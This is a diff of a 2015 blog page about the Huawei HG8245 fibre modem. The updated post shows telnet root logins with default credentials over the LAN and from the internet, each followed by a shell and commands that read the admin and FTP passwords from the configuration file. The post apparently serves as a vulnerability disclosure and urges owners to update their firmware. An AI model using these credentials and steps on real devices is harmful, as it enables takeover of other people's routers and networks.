@@ -4,7 +4,7 @@
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	
-	<title>AisenLink - HG8245 - Root Password to Reveal Hidden Menu</title>
+	<title>AisenLink - HG8245 - Internet Backdoor and Remote Access</title>
 	
 	<link rel="stylesheet" href="/css/pure-min.css">
 	<link rel="stylesheet" href="/css/blog.css">
@@ -62,10 +62,10 @@
 		<h1 class="content-subhead">Read Post</h1>
 		<div class = "post-header">
 			<!--<img class="post-avatar" height="48" width="48" src="/avatar/eka.jpg" />-->
-			<h2 class="post-title">HG8245 - Root Password to Reveal Hidden Menu</h2>
+			<h2 class="post-title">HG8245 - Internet Backdoor and Remote Access</h2>
 			<p class="post-meta">
 				<span class="fa fa-calendar" aria-hidden="true"></span>
-				2015-05-07
+				2015-05-08
 				<br>
 				<span class="fa fa-tag" aria-hidden="true"></span>
 				
@@ -80,45 +80,58 @@
 			</p>
 		</div>
 		<div class="post-description">
-		<p>I managed to hook a USB to serial cable in <a href="/2015/05/05/a-look-into-huawei-hg8245-ont.html">here</a> to get access to console. Then, I stumbled across a <a href="http://www.cnblogs.com/craftor/archive/2012/10/25/2740130.html">blog post</a> explaining how to gain root access. This access to root can be used to revealed a hidden menu within the web interface.</p>
+		<p>Hackers are very unlikely to break in to SOHO network from serial port, like in <a href="2015/05/07/hg8245-root-password-to-reveal-hidden-menu.html">this post</a>. This post is showing you that HG8245 can be exploited to get root access from the internet. The root password is permanently stored in the flash ROM and cannot be changed.</p>
+
+<p>The setup was very easy. One computer was connected to HG8245 through a LAN cable. Then I ran telnet and use root:admin access. Voila, connection was established! The next commmand was easy, call the <code>shell</code>.</p>
 
 <!--more-->
 
 
-<p>This is how to get the telecomadmin's password:</p>
-
-<pre><code>WAP(Dopra Linux) # grep telecomadmin /mnt/jffs2/hw_ctree.xml
-&lt;X_HW_WebUserInfoInstance InstanceID="2" UserName="telecomadmin" Password="telecomadmin35198845" UserLevel="0" Enable="1"/&gt;
-WAP(Dopra Linux) # </code></pre>
 
 
-<p>This is how to get the useradmin's password:</p>
+<pre><code>telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
 
-<pre><code>WAP(Dopra Linux) # grep useradmin /mnt/jffs2/hw_ctree.xml
-&lt;X_HW_WebUserInfoInstance InstanceID="1" UserName="useradmin" Password="ssn2q" UserLevel="1" Enable="1"/&gt;
-WAP(Dopra Linux) # </code></pre>
+Welcome Visiting Huawei Home Gateway
+Copyright by Huawei Technologies Co., Ltd.
 
+Login:root
+Password:*****
+WAP>shell
 
-<p>When you login to web interface using useradmin, this is what you get:</p>
+BusyBox v1.4.1 (2011-07-29 10:25:20 HKT) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
 
-<p><img class="img-responsive" src="/images/hg8245_useradmin.jpg" /></p>
-
-<p>But when you login to web interface using telecomadmin, there is one additional menu showing up:</p>
-
-<p><img class="img-responsive" src="/images/hg8245_telecomadmin.jpg" /></p>
-
-<p>What if we try <code>grep admin</code> keyword? This is what you will get:</p>
-
-<pre><code>WAP(Dopra Linux) # grep admin /mnt/jffs2/hw_ctree.xml
-&lt;X_HW_WebUserInfoInstance InstanceID="1" UserName="useradmin" Password="ssn2q" UserLevel="1" Enable="1"/&gt;
+WAP(Dopra Linux) # grep telecomadmin /mnt/jffs2/hw_ctree.xml
 &lt;X_HW_WebUserInfoInstance InstanceID="2" UserName="telecomadmin" Password="nE7jA%5m" UserLevel="0" Enable="1"/&gt;
-&lt;X_HW_ServiceManage FtpEnable="0" FtpUserName="root" FtpPassword="admin" FtpPort="21" FtpRoorDir="/mnt/usb1_1/" FtpUserNum="0"/&gt;
 WAP(Dopra Linux) # </code></pre>
 
 
-<p>It turned out that this ONT has a built-in FTP server running, with default root directory at <code>/mnt/usb1_1</code>. If you hook up a USB storage on its USB port, this ONT can be used as a file server, that can be accessed from anywhere. Cool stuff! But there is a flaw in the system. The password cannot be changed!</p>
+<p>Alright... alright... probably because it is local, LAN access. What about telnetting from the internet? First, connect the HG8245 to your ISP provider and find its IP address. Then telnetting...</p>
 
-<p>Why don't you try to copy <code>hw_ctree.xml</code> to a USB flash and analyze it further? I bet you would find a lot more hidden stuff in there. Let me know if you find anything interesting.</p>
+<pre><code>telnet 183.x.x.x
+Trying 183.x.x.x...
+Connected to 183.x.x.x.
+Escape character is '^]'.
+
+Welcome Visiting Huawei Home Gateway
+Copyright by Huawei Technologies Co., Ltd.
+
+Login:root
+Password:*****
+WAP>shell
+
+BusyBox v1.4.1 (2011-07-29 10:25:20 HKT) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+WAP(Dopra Linux) # grep telecomadmin /mnt/jffs2/hw_ctree.xml
+&lt;X_HW_WebUserInfoInstance InstanceID="2" UserName="telecomadmin" Password="nE7jA%5m" UserLevel="0" Enable="1"/&gt;
+WAP(Dopra Linux) # </code></pre>
+
+
+<p>Unbelievable! Super scary! Too easy to break in! Anyone owns one of this ONT should try to upgrade to the latest firmware. Better yet, install OpenWrt!</p>
 
 		</div>
 	</div>
@@ -126,10 +139,8 @@ WAP(Dopra Linux) # </code></pre>
 
 <div class="post">
 	
-	<a href='/2015/05/07/cc-flasher-osx-yosemite.html'>← Prev</a>
+	<a href='/2015/05/07/hg8245-root-password-to-reveal-hidden-menu.html'>← Prev</a>
 	
-	
-	<a href='/2015/05/08/hg8245-internet-backdoor-remote-access.html'>Next →</a>
 	
 </div>
 
